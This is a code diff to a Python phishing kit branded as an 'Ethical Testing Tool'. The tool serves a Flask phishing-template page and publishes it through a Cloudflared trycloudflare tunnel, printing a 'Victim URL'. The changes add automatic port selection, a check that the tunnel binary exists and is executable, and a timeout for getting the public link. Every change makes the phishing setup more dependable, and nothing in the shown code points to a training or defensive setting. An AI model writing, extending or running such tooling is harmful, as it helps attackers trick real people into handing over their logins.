@@ -4,6 +4,7 @@ import subprocess
 import platform
 import shutil
 import time
+import socket
 from flask import Flask, request, render_template
 from typing import Optional
 
@@ -25,7 +26,7 @@ def display_banner():
     print("╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═██║═╝ ")
     print("\033[1;94m")
     print("                H A T B OY")
-    print("         Ethical Testing Tool v3.0")
+    print("         Ethical Testing Tool v3.1")
     print("\033[1;93m")
     print("       Developed by Mister-God")
     print("\033[0m")
@@ -42,6 +43,20 @@ def load_config() -> dict:
 def save_config(config: dict):
     with open(CONFIG_FILE, "w") as file:
         json.dump(config, file, indent=4)
+
+# Check if a port is in use
+def is_port_in_use(port: int) -> bool:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        return s.connect_ex(("127.0.0.1", port)) == 0
+
+# Get an available port if the default is in use
+def get_available_port(default_port: int) -> int:
+    port = default_port
+    while is_port_in_use(port):
+        print(f"[!] Port {port} is in use. Trying the next available port...")
+        port += 1
+    print(f"[*] Using available port: {port}")
+    return port
 
 # Check and install dependencies
 def check_dependencies():
@@ -87,9 +102,12 @@ def install_cloudflared():
 # Start a Cloudflared tunnel
 def start_cloudflared(port: str) -> Optional[str]:
     cloudflared_path = ".server/cloudflared"
-    if not os.path.exists(cloudflared_path):
-        print("[!] Cloudflared binary is missing. Attempting to reinstall...")
+    
+    # Verify if the Cloudflared binary exists and is executable
+    if not os.path.exists(cloudflared_path) or not os.access(cloudflared_path, os.X_OK):
+        print("[!] Cloudflared binary is missing or not executable. Attempting to reinstall...")
         install_cloudflared()
+    
     try:
         print("[*] Starting Cloudflared...")
         process = subprocess.Popen(
@@ -98,13 +116,36 @@ def start_cloudflared(port: str) -> Optional[str]:
             stderr=subprocess.PIPE,
             text=True,
         )
-        for line in process.stdout:
+        
+        # Set a timeout for Cloudflared to generate the URL
+        start_time = time.time()
+        timeout = 30  # 30 seconds timeout
+        
+        while True:
+            line = process.stdout.readline()
+            if not line:
+                break
             print(f"[Cloudflared Log] {line.strip()}")
+            
+            # Look for the generated URL
             if "trycloudflare.com" in line:
                 return line.split(" ")[-1].strip()
+            
+            # Check if timeout has been reached
+            if time.time() - start_time > timeout:
+                print("[!] Cloudflared failed to generate a URL within the timeout period.")
+                process.terminate()
+                return None
+        
+        # If the process completes without generating a URL
+        process.wait()
+        if process.returncode != 0:
+            print("[!] Cloudflared exited with an error.")
+            raise Exception(process.stderr.read())
+    
     except Exception as e:
         print(f"[!] Error starting Cloudflared: {e}")
-    return None
+        return None
 
 # Flask route for phishing template
 @app.route("/", methods=["GET", "POST"])
@@ -124,11 +165,14 @@ def phishing_page():
 # Main menu
 def main_menu():
     config = load_config()
-    port = config.get("port", "8080")
+    default_port = int(config.get("port", "8080"))
+    port = get_available_port(default_port)
+    
     print("[*] Select an option:")
     print("[1] Localhost")
     print("[2] Cloudflared")
     choice = input("Enter your choice: ").strip()
+    
     if choice == "1":
         app.run(host="127.0.0.1", port=port)
         print(f"[+] Victim URL: http://127.0.0.1:{port}")
